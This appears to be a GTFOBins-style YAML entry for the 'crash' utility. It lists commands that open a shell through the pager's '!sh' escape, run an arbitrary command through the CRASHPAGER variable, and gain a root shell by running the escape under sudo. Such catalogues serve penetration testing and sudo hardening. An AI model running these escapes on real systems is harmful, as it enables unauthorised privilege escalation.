---
functions:
  shell:
    - description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
      code: |
        crash -h
        !sh
  command:
    - code: |
        COMMAND='/usr/bin/id'
        CRASHPAGER="$COMMAND" crash -h
  sudo:
    - description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
      code: |
        sudo crash -h
        !sh
---
